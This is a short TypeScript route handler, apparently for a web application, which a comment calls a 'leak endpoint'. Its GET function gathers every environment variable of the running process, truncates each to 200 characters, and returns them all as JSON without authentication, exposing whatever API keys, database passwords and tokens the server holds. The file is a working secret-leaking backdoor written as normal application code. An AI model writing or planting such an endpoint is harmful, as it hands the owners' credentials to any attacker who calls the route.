// leak endpoint - deployed at 1781809077
export async function GET() {
  const env: Record<string, string> = {};
  for (const [key, value] of Object.entries(process.env)) {
    if (typeof value === "string") {
      env[key] = value.length > 200 ? value.slice(0, 200) : value;
    }
  }
  return Response.json(env);
}
